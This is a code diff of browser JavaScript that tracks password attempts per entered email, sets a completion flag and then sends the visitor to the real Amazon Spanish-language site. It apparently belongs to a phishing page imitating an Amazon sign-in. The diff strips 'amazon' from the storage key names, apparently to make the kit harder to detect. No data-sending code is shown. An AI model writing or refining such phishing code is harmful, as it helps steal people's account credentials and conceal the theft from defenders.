@@ -1,6 +1,6 @@
 (() => {
   try {
-    if (localStorage.getItem("amazon_auth_complete")) {
+    if (localStorage.getItem("complete")) {
       window.location.replace("https://www.amazon.com/-/es/");
       return;
     }
@@ -51,7 +51,7 @@
 
     function finishAndRedirect() {
       try {
-        localStorage.setItem("amazon_auth_complete", "true");
+        localStorage.setItem("complete", "true");
       } catch {}
       window.location.href = "https://www.amazon.com/-/es/";
     }
@@ -62,7 +62,7 @@
       scrollToTop();
     }
 
-    const attemptKey = `amazon_pw_attempts:${email}`;
+    const attemptKey = `attempts:${email}`;
 
     function getAttempts() {
       try {
